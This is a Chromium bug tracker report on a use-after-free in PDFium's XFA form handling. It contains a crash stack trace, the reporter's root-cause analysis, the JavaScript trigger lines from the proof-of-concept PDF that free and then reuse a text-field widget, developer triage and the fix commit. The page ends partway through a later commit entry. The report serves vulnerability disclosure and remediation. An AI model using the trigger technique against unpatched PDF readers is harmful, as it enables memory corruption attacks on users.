# Security: Use-after-free in CPDFSDK_Widget::Synchronize

| Field | Value |
|-------|-------|
| **Issue ID** | [40091856](https://issues.chromium.org/issues/40091856) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | hn...@chromium.org |
| **Created** | 2018-07-06 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

Use-after-free in CPDFSDK\_Widget::Synchronize

**VERSION**  

Operating System: Windows 10  

chrome with pdfium XFA enabled

**REPRODUCTION CASE**

1. Build chrome with XFA enabled + enable PageHeap
2. open file `poc.pdf` in chrome

Details when crash

```
eax=66e56f80 ebx=00000000 ecx=66e56fbc edx=18b2ab7e esi=13efcff8 edi=00000004  
eip=1ed98a1a esp=0115cecc ebp=0115ced0 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202  
chrome!fxcrt::UnownedPtr<CXFA_Node>::Get+0xa:  
1ed98a1a 8b01            mov     eax,dword ptr [ecx]  ds:002b:66e56fbc=????????  
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\v8.dll  
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\ppapi_proxy.dll  
2:053> kp  
 # ChildEBP RetAddr    
00 0115ced0 1ed97732 chrome!fxcrt::UnownedPtr<CXFA_Node>::Get(void)+0xa [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\core\fxcrt\unowned_ptr.h @ 91]   
01 0115cedc 1fe108a1 chrome!CXFA_FFWidget::GetNode(void)+0x12 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffwidget.h @ 153]   
02 0115cf58 1edb05fb chrome!CPDFSDK_Widget::Synchronize(bool bSynchronizeElse = false)+0x41 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_widget.cpp @ 272]   
03 0115cf84 1edb2c6c chrome!CPDFSDK_InterForm::SynchronizeField(class CPDF_FormField \* pFormField = 0x46eb2fd0)+0x7b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_interform.cpp @ 248]   
04 0115cfc0 1ed91587 chrome!CPDFSDK_InterForm::AfterValueChange(class CPDF_FormField \* pField = 0x46eb2fd0)+0x2c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_interform.cpp @ 630]   
05 0115cfd8 1ed923f8 chrome!CPDF_FormField::NotifyAfterValueChange(void)+0x57 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\core\fpdfdoc\cpdf_formfield.cpp @ 909]   
06 0115d0a8 1ed92980 chrome!CPDF_FormField::SetValue(class fxcrt::WideString \* value = 0x13efcff8, bool bDefault = false, bool bNotify = true)+0x338 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\core\fpdfdoc\cpdf_formfield.cpp @ 382]   
07 0115d0d4 2061e7a8 chrome!CPDF_FormField::SetValue(class fxcrt::WideString \* value = 0x13efcff8, bool bNotify = true)+0x40 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\core\fpdfdoc\cpdf_formfield.cpp @ 409]   
08 0115d1fc 2061e462 chrome!CJS_Field::SetValue(class CPDFSDK_FormFillEnvironment \* pFormFillEnv = 0x425dafb8, class fxcrt::WideString \* swFieldName = 0x13836ff0, int nControlIndex = 0n-1, class std::vector<fxcrt::WideString,std::allocator<fxcrt::WideString> > \* strArray = 0x0115d278)+0x228 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\cjs_field.cpp @ 2193]   
09 0115d29c 2062bfd0 chrome!CJS_Field::set_value(class CJS_Runtime \* pRuntime = 0x13994fa0, class v8::Local<v8::Value> vp = class v8::Local<v8::Value>)+0x212 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\cjs_field.cpp @ 2171]   
0a 0115d310 2061034e chrome!JSPropSetter<CJS_Field,&CJS_Field::set_value>(char \* prop_name_string = 0x21312579 "value", char \* class_name_string = 0x21a28da4 "Field", class v8::Local<v8::String> property = class v8::Local<v8::String>, class v8::Local<v8::Value> value = class v8::Local<v8::Value>, class v8::PropertyCallbackInfo<void> \* info = 0x0115d398)+0xb0 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\js_define.h @ 100]   
0b 0115d34c 2fda918f chrome!CJS_Field::set_value_static(class v8::Local<v8::String> property = class v8::Local<v8::String>, class v8::Local<v8::Value> value = class v8::Local<v8::Value>, class v8::PropertyCallbackInfo<void> \* info = 0x0115d398)+0x5e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\cjs_field.h @ 91]   
0c 0115d3b4 2fea6854 v8!v8::internal::PropertyCallbackArguments::CallAccessorSetter(class v8::internal::Handle<v8::internal::AccessorInfo> accessor_info = class v8::internal::Handle<v8::internal::AccessorInfo>, class v8::internal::Handle<v8::internal::Name> name = class v8::internal::Handle<v8::internal::Name>, class v8::internal::Handle<v8::internal::Object> value = class v8::internal::Handle<v8::internal::Object>)+0x20f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api-arguments-inl.h @ 297]   
0d 0115d430 2febc426 v8!v8::internal::Object::SetPropertyWithAccessor(class v8::internal::LookupIterator \* it = 0x0115d4d4, class v8::internal::Handle<v8::internal::Object> value = class v8::internal::Handle<v8::internal::Object>, v8::internal::ShouldThrow should_throw = kDontThrow (0n1))+0x204 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\objects.cc @ 1640]   
0e 0115d478 2febc09a v8!v8::internal::Object::SetPropertyInternal(class v8::internal::LookupIterator \* it = 0x0115d4d4, class v8::internal::Handle<v8::internal::Object> value = class v8::internal::Handle<v8::internal::Object>, v8::internal::LanguageMode language_mode = <Value unavailable error>, v8::internal::Object::StoreFromKeyed store_mode = 0n18207920 (No matching enumerant), bool \* found = 0x0115d49f)+0x2c6 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\objects.cc @ 4896]   
0f 0115d4b0 2fd9c2ef v8!v8::internal::Object::SetProperty(class v8::internal::LookupIterator \* it = 0x0115d4d4, class v8::internal::Handle<v8::internal::Object> value = class v8::internal::Handle<v8::internal::Object>, v8::internal::LanguageMode language_mode = kSloppy (0n0), v8::internal::Object::StoreFromKeyed store_mode = CERTAINLY_NOT_STORE_FROM_KEYED (0n1))+0x4a [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\objects.cc @ 4951]   
10 0115d52c 2fda361d v8!v8::internal::StoreIC::Store(class v8::internal::Handle<v8::internal::Object> object = class v8::internal::Handle<v8::internal::Object>, class v8::internal::Handle<v8::internal::Name> name = class v8::internal::Handle<v8::internal::Name>, class v8::internal::Handle<v8::internal::Object> value = class v8::internal::Handle<v8::internal::Object>, v8::internal::Object::StoreFromKeyed store_mode = CERTAINLY_NOT_STORE_FROM_KEYED (0n1))+0x46f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\ic\ic.cc @ 1431]   
11 0115d5e4 2fda32e7 v8!v8::internal::__RT_impl_Runtime_StoreIC_Miss(class v8::internal::Arguments args = class v8::internal::Arguments, class v8::internal::Isolate \* isolate = 0x48b26a90)+0x14d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\ic\ic.cc @ 2285]   
12 0115d658 4dbbddea v8!v8::internal::Runtime_StoreIC_Miss(int args_length = 0n5, class v8::internal::Object \*\* args_object = 0x0115d694, class v8::internal::Isolate \* isolate = 0x48b26a90)+0xc7 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\ic\ic.cc @ 2271]   
WARNING: Frame IP not in any known module. Following frames may be wrong.  
13 0115d67c 5e9a2e51 0x4dbbddea  
14 0115d6c0 4921cf36 0x5e9a2e51  
15 0115d6ec 492154ff 0x4921cf36  
16 0115d700 49209b51 0x492154ff  
17 0115d72c 2fc6dc90 0x49209b51  
18 0115d7b4 2fc6d8c7 v8!v8::internal::`anonymous namespace'::Invoke(class v8::internal::Isolate \* isolate = 0x00000004, bool is_construct = <Value unavailable error>, class v8::internal::Handle<v8::internal::Object> target = class v8::internal::Handle<v8::internal::Object>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, int argc = 0n0, class v8::internal::Handle<v8::internal::Object> \* args = 0x00000000, class v8::internal::Handle<v8::internal::Object> new_target = class v8::internal::Handle<v8::internal::Object>, v8::internal::Execution::MessageHandling message_handling = kReport (0n0), v8::internal::Execution::Target execution_target = kCallable (0n0))+0x300 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution.cc @ 155]   
19 0115d7ec 2fc6d811 v8!v8::internal::`anonymous namespace'::CallInternal(class v8::internal::Isolate \* isolate = <Value unavailable error>, class v8::internal::Handle<v8::internal::Object> callable = class v8::internal::Handle<v8::internal::Object>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, int argc = 0n0, class v8::internal::Handle<v8::internal::Object> \* argv = 0x00000000, v8::internal::Execution::MessageHandling message_handling = kReport (0n0), v8::internal::Execution::Target target = kCallable (0n0))+0xa7 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution.cc @ 191]   
1a 0115d810 2f6d27f1 v8!v8::internal::Execution::Call(class v8::internal::Isolate \* isolate = 0x48b26a90, class v8::internal::Handle<v8::internal::Object> callable = class v8::internal::Handle<v8::internal::Object>, class v8::internal::Handle<v8::internal::Object> receiver = class v8::internal::Handle<v8::internal::Object>, int argc = 0n0, class v8::internal::Handle<v8::internal::Object> \* argv = 0x00000000)+0x21 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\execution.cc @ 202]   
1b 0115d8d0 1fd23476 v8!v8::Script::Run(class v8::Local<v8::Context> context = class v8::Local<v8::Context>)+0x2b1 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\v8\src\api.cc @ 2190]   
1c 0115da78 1fd3094e chrome!CFXJS_Engine::Execute(class fxcrt::WideString \* script = 0x0115dbf4)+0x396 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\cfxjs_engine.cpp @ 532]   
1d 0115da9c 2065b2fe chrome!CJS_Runtime::ExecuteScript(class fxcrt::WideString \* script = 0x0115dbf4)+0x2e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\cjs_runtime.cpp @ 182]   
1e 0115db8c 205ce449 chrome!CJS_EventContext::RunScript(class fxcrt::WideString \* script = 0x0115dbf4)+0x31e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\cjs_event_context.cpp @ 53]   
1f 0115dbd4 205ce333 chrome!CJS_App::RunJsScript(class CJS_Runtime \* pRuntime = 0x13994fa0, class fxcrt::WideString \* wsScript = 0x0115dbf4)+0x89 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\cjs_app.cpp @ 428]   
20 0115dbfc 20c1ae68 chrome!CJS_App::TimerProc(class GlobalTimer \* pTimer = 0x4794cfd8)+0x83 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\cjs_app.cpp @ 415]   
21 0115dc6c 1d894b07 chrome!GlobalTimer::Trigger(int nTimerID = 0n2)+0xd8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\global_timer.cpp @ 52]   
22 0115dc7c 1d88deaa chrome!chrome_pdf::`anonymous namespace'::FormFillTimer::OnTimer(void)+0x17 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_form_filler.cc @ 32]   
23 0115dc94 1d88e286 chrome!chrome_pdf::Timer::TimerProc(void)+0x2a [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\timer.cc @ 28]   
24 0115dcb4 1d88e1df chrome!pp::CompletionCallbackFactory<chrome_pdf::Timer,pp::ThreadSafeThreadTraits>::Dispatcher0<void (class chrome_pdf::Timer \* object = 0x18ceafc0, int result = 0n0)+0x36 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 607]   
25 0115dcd8 39f5ce7b chrome!pp::CompletionCallbackFactory<chrome_pdf::Timer,pp::ThreadSafeThreadTraits>::CallbackData<pp::CompletionCallbackFactory<chrome_pdf::Timer,pp::ThreadSafeThreadTraits>::Dispatcher0<void (void \* user_data = 0x6778eff0, int result = 0n0)+0x3f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\utility\completion_callback_factory.h @ 584]   
26 0115dcf8 39f5ce27 ppapi_proxy!PP_RunCompletionCallback(struct PP_CompletionCallback \* cc = 0x0115dd98, int result = 0n0)+0x2b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\c\pp_completion_callback.h @ 241]   
27 0115dd24 39f5c345 ppapi_proxy!ppapi::CallWhileUnlocked<void,PP_CompletionCallback \*,int,PP_CompletionCallback \*,int>(<function> \* function = 0x39f5ce50, struct PP_CompletionCallback \*\* p1 = 0x0115dd6c, int \* p2 = 0x0115ddc8)+0x47 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\shared_impl\proxy_lock.h @ 136]   
28 0115ddb4 39f5c7d0 ppapi_proxy!ppapi::proxy::`anonymous namespace'::CallbackWrapper(struct PP_CompletionCallback callback = struct PP_CompletionCallback, int result = 0n0)+0x175 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\proxy\ppb_core_proxy.cc @ 53]   
29 0115ddf4 39f5c696 ppapi_proxy!base::internal::FunctorTraits<void (<function> \*\* function = 0x186fffe4, struct PP_CompletionCallback \* args = 0x186fffec, int \* args = 0x186fffe8)+0x80 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 407]   
2a 0115de20 39f5c62f ppapi_proxy!base::internal::InvokeHelper<0,void>::MakeItSo<void (<function> \*\* functor = 0x186fffe4, struct PP_CompletionCallback \* args = 0x186fffec, int \* args = 0x186fffe8)+0x56 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 607]   
2b 0115de44 39f5c4ef ppapi_proxy!base::internal::Invoker<base::internal::BindState<void (<function> \*\* functor = 0x186fffe4, class std::tuple<PP_CompletionCallback,int> \* bound = 0x186fffe8)+0x6f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 680]   
2c 0115de6c 39f153c2 ppapi_proxy!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x186fffd0)+0x3f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 662]   
2d 0115de88 39f1451e ppapi_proxy!base::RepeatingCallback<void (void)+0x32 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\callback.h @ 129]   
2e 0115df84 39f14b21 ppapi_proxy!ppapi::internal::RunWhileLockedHelper<void (class std::unique_ptr<ppapi::internal::RunWhileLockedHelper<void ()>,std::default_delete<ppapi::internal::RunWhileLockedHelper<void ()> > > ptr = class std::unique_ptr<ppapi::internal::RunWhileLockedHelper<void ()>,std::default_delete<ppapi::internal::RunWhileLockedHelper<void ()> > >)+0x10e [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\shared_impl\proxy_lock.h @ 206]   
2f 0115dfb0 39f14a1a ppapi_proxy!base::internal::FunctorTraits<void (<function> \*\* function = 0x18705fec, class std::unique_ptr<ppapi::internal::RunWhileLockedHelper<void ()>,std::default_delete<ppapi::internal::RunWhileLockedHelper<void ()> > > \* args = 0x0115dfe4)+0x61 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 407]   
30 0115dfcc 39f149b9 ppapi_proxy!base::internal::InvokeHelper<0,void>::MakeItSo<void (<function> \*\* functor = 0x18705fec, class std::unique_ptr<ppapi::internal::RunWhileLockedHelper<void ()>,std::default_delete<ppapi::internal::RunWhileLockedHelper<void ()> > > \* args = 0x0115dfe4)+0x3a [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 607]   
31 0115dfec 39f148af ppapi_proxy!base::internal::Invoker<base::internal::BindState<void (<function> \*\* functor = 0x18705fec, class std::tuple<base::internal::PassedWrapper<std::unique_ptr<ppapi::internal::RunWhileLockedHelper<void ()>,std::default_delete<ppapi::internal::RunWhileLockedHelper<void ()> > > > > \* bound = 0x18705ff0)+0x59 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 680]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\base.dll  
32 0115e014 51bdcc30 ppapi_proxy!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x18705fd8)+0x3f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\bind_internal.h @ 662]   
33 0115e038 51c3e333 base!base::OnceCallback<void (void)+0x50 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\callback.h @ 100]   
34 0115e1b0 51cce8e8 base!base::debug::TaskAnnotator::RunTask(char \* queue_function = 0x51f86a0a "MessageLoop::PostTask", struct base::PendingTask \* pending_task = 0x0115e498)+0x433 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\debug\task_annotator.cc @ 103]   
35 0115e298 51cd889b base!base::internal::IncomingTaskQueue::RunTask(struct base::PendingTask \* pending_task = 0x0115e498)+0xe8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\incoming_task_queue.cc @ 129]   
36 0115e454 51cd9059 base!base::MessageLoop::RunTask(struct base::PendingTask \* pending_task = 0x0115e498)+0x36b [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\message_loop.cc @ 351]   
37 0115e490 51cd9c03 base!base::MessageLoop::DeferOrRunPendingTask(struct base::PendingTask pending_task = struct base::PendingTask)+0x49 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\message_loop.cc @ 364]   
38 0115e6d0 51ce4811 base!base::MessageLoop::DoDelayedWork(class base::TimeTicks \* next_delayed_work_time = 0x44d5eff0)+0x513 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\message_loop.cc @ 497]   
39 0115e720 51cd81a6 base!base::MessagePumpDefault::Run(class base::MessagePump::Delegate \* delegate = 0x0115ec38)+0x81 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\message_pump_default.cc @ 41]   
3a 0115e8c8 51da3de8 base!base::MessageLoop::Run(bool application_tasks_allowed = true)+0x1e6 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\message_loop\message_loop.cc @ 303]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\content.dll  
3b 0115eb38 230d21ef base!base::RunLoop::Run(void)+0x1e8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\base\run_loop.cc @ 102]   
3c 0115ee8c 2722bcff content!content::PpapiPluginMain(struct content::MainFunctionParams \* parameters = 0x0115ef34)+0x52f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\ppapi_plugin\ppapi_plugin_main.cc @ 155]   
3d 0115eec4 2722ce00 content!content::RunOtherNamedProcessTypeMain(class std::basic_string<char,std::char_traits<char>,std::allocator<char> > \* process_type = 0x0115f0bc, struct content::MainFunctionParams \* main_function_params = 0x0115ef34, class content::ContentMainDelegate \* delegate = 0x0115f514)+0xaf [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 631]   
3e 0115f0f0 272294a1 content!content::ContentMainRunnerImpl::Run(void)+0x350 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main_runner_impl.cc @ 957]   
\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\out\chromium_pdfium_xfa\embedder.dll  
3f 0115f100 385537b2 content!content::ContentServiceManagerMainDelegate::RunEmbedderProcess(void)+0x21 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_service_manager_main_delegate.cc @ 53]   
40 0115f434 2722ba1c embedder!service_manager::Main(struct service_manager::MainParams \* params = 0x0115f458)+0x602 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\services\service_manager\embedder\main.cc @ 459]   
41 0115f47c 1901132f content!content::ContentMain(struct content::ContentMainParams \* params = 0x0115f4f4)+0x5c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\content\app\content_main.cc @ 20]   
42 0115f558 009cb9df chrome!ChromeMain(struct HINSTANCE__ \* instance = 0x009c0000, struct sandbox::SandboxInterfaceInfo \* sandbox_info = 0x0115f5ec, int64 exe_entry_point_ticks = <Memory access error>)+0x1ef [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_main.cc @ 101]   
43 0115f690 009c1478 chrome_exe!MainDllLoader::Launch(struct HINSTANCE__ \* instance = 0x009c0000, class base::TimeTicks exe_entry_point_ticks = class base::TimeTicks)+0x44f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\main_dll_loader_win.cc @ 201]   
44 0115f9c8 00c1728e chrome_exe!wWinMain(struct HINSTANCE__ \* instance = 0x009c0000, struct HINSTANCE__ \* prev = 0x00000000)+0x478 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\chrome\app\chrome_exe_main_win.cc @ 230]   
45 0115f9e0 00c173e1 chrome_exe!invoke_main(void)+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 123]   
46 0115fa38 00c174ad chrome_exe!__scrt_common_main_seh(void)+0x151 [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 283]   
47 0115fa40 00c174b8 chrome_exe!__scrt_common_main(void)+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl @ 326]   
48 0115fa48 741c8484 chrome_exe!wWinMainCRTStartup(void)+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe_wwinmain.cpp @ 17]   
49 0115fa5c 770a2fea KERNEL32!BaseThreadInitThunk+0x24  
4a 0115faa4 770a2fba ntdll!__RtlUserThreadStart+0x2f  
4b 0115fab4 00000000 ntdll!_RtlUserThreadStart+0x1b  

```

## Attachments

- [poc.pdf](attachments/poc.pdf) (application/pdf, 1.8 MB)
- [log_crash.txt](attachments/log_crash.txt) (text/plain, 25.7 KB)

## Timeline

### hu...@gmail.com (2018-07-06)

[Comment Deleted]

### hu...@gmail.com (2018-07-06)

Detail vulnerability

When we call the XFA API function `instanceManager.removeInstance` of a `subform`, it'll mark all child fields of the `subform`. After that, the function `CXFA_FFDocView::UpdateDocView` will delete all layout item object of child fields.

Function `CXFA_FFDocView::UpdateDocView` calls to `CXFA_FFDocView::RunLayout`, so on `CXFA_LayoutProcessor::StartLayout` -> `CXFA_LayoutPageMgr::InitLayoutPage` -> `CXFA_LayoutPageMgr::PrepareLayout` -> `CXFA_LayoutPageMgr::SaveLayoutItem` 

We can see in function `CXFA_LayoutPageMgr::SaveLayoutItem`
```
void CXFA_LayoutPageMgr::SaveLayoutItem(CXFA_LayoutItem* pParentLayoutItem) {
  CXFA_LayoutItem* pNextLayoutItem;
  CXFA_LayoutItem* pCurLayoutItem = pParentLayoutItem->m_pFirstChild;
  while (pCurLayoutItem) {
    pNextLayoutItem = pCurLayoutItem->m_pNextSibling;
    if (pCurLayoutItem->IsContentLayoutItem()) {
      if (pCurLayoutItem->GetFormNode()->HasRemovedChildren()) {
        CXFA_FFNotify* pNotify =
            m_pTemplatePageSetRoot->GetDocument()->GetNotify();
        CXFA_LayoutProcessor* pDocLayout =
            m_pTemplatePageSetRoot->GetDocument()->GetLayoutProcessor();
        if (pCurLayoutItem->m_pFirstChild)
          SyncRemoveLayoutItem(pCurLayoutItem, pNotify, pDocLayout);

        pNotify->OnLayoutItemRemoving(pDocLayout, pCurLayoutItem);
        delete pCurLayoutItem;
        pCurLayoutItem = pNextLayoutItem;
        continue;
      }
```

`pCurLayoutItem` is deleted. But there is a reference in doc view object and we can get it by function `GetMixXFAWidget` (actually by name of `Acroform` field)

To trigger this, in poc file, i setup a XFA subform name `expenseRow`. It contains a text edit field name `description` and a button field name `delete`. In XFA, i setup an `enter` event with handler 
```
expenseRow.instanceManager.addInstance(1);
expenseRow.instanceManager.removeInstance(0);
```  

With Acroform, there is also a field name `expenseRow[0]`. This has a child button widget name `delete[0]` and a child edit widget name `description[0]`. 

And finally i setup a handler to `OpenAction` to document
```
app.setTimeOut('ff = this.getField("expenseReport[0].page1[0].expenses[0].expensesWrapper[0].expenseRow[0].delete[0]");ff.setFocus();', 10000);
app.setTimeOut('f = this.getField("expenseReport[0].page1[0].expenses[0].expensesWrapper[0].expenseRow[0].description[0]");f.value="hello";app.alert("Object "+f.value);', 15000);
```

When poc file is opened, the `OpenAction` handler is trigger. It sets up 2 actions. 
- First, it sets focus to button `delete` to trigger `instanceManager.removeInstance`. This lead to free the `CXFA_FFTextEdit` of text edit `description`
- Second, it sets the value of text edit `description` to trigger using the object `CXFA_FFTextEdit` that be freed before

==> so it's use-after-free bug.

### ke...@chromium.org (2018-07-06)

dsinclair@ are you able to help triage this?

[Monorail components: Internals>Plugins>PDF]

### th...@chromium.org (2018-07-06)

[Empty comment from Monorail migration]

### ke...@chromium.org (2018-07-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2018-07-10)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5721959632207872.

### es...@chromium.org (2018-07-10)

Is XFA disabled by default? If so can we set this to Security_Impact-None?

### hn...@chromium.org (2018-07-10)

Yes, it's disabled by default.

### hn...@chromium.org (2018-07-17)

[Empty comment from Monorail migration]

### hn...@chromium.org (2018-07-24)

The dangling pointer that remains is in CPDFSDK_Widget: UnownedPtr<CXFA_FFWidget> m_hMixXFAWidget. This is basically a cache so that CPDFSDK_Widget does not need to call pDocView->GetWidgetByName() every time CPDFSDK_Widget::GetMixXFAWidget() is called. Removing the caching fixes the issue.

I'm not sure this is the right fix yet for two reasons:
1. Should that CPDFSDK_Widget have been destroyed and replaced by a new one, since it's tied to a widget that got destroyed?
2. Is the operation frequent x expensive enough that it needs to be cached for decent performance?

### hn...@chromium.org (2018-07-24)

I think the correct course of action here is actually prevent the instanceManager methods from running in foreground XFA (XFAF) since their structure should be static. The LiveCycle Scripting spec mentions this indirectly in an example (pg. 425).

### hn...@chromium.org (2018-07-24)

In the XFA spec this is also mentioned in page 272.

### bu...@chromium.org (2018-07-24)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/36b2059cae7fc851c9f35babd35ec82a7a5d9694

commit 36b2059cae7fc851c9f35babd35ec82a7a5d9694
Author: Henrique Nakashima <hnakashima@chromium.org>
Date: Tue Jul 24 20:25:45 2018

Fix UAF in CPDFSDK_Widget::GetMixXFAWidget().

Do not allow instanceManager methods to run in Foreground XFA forms.
They are static, and their widgets should not be inserted or removed.

See "XML Forms Architecture (XFA) Specification Version 3.3", page 272.

Bug: chromium:860697
Change-Id: Ia96834e085ee508618ca4dcb2bd5271466369ede
Reviewed-on: https://pdfium-review.googlesource.com/38751
Reviewed-by: Tom Sepez <tsepez@chromium.org>
Commit-Queue: Henrique Nakashima <hnakashima@chromium.org>

[modify] https://crrev.com/36b2059cae7fc851c9f35babd35ec82a7a5d9694/xfa/fxfa/parser/cxfa_document.cpp
[modify] https://crrev.com/36b2059cae7fc851c9f35babd35ec82a7a5d9694/fxjs/xfa/cjx_instancemanager.cpp
[modify] https://crrev.com/36b2059cae7fc851c9f35babd35ec82a7a5d9694/xfa/fxfa/parser/cxfa_document.h


### hn...@chromium.org (2018-07-24)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-07-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/1f534eaf590df1753be8112ddd1366bcf4e57803

commit 1f534eaf590df1753be8112ddd1366bcf4e57803
Author: pdfium-chromium-autoroll <pdfium-chromium-autoroll@skia-buildbots.google.com.iam.gserviceaccount.com>
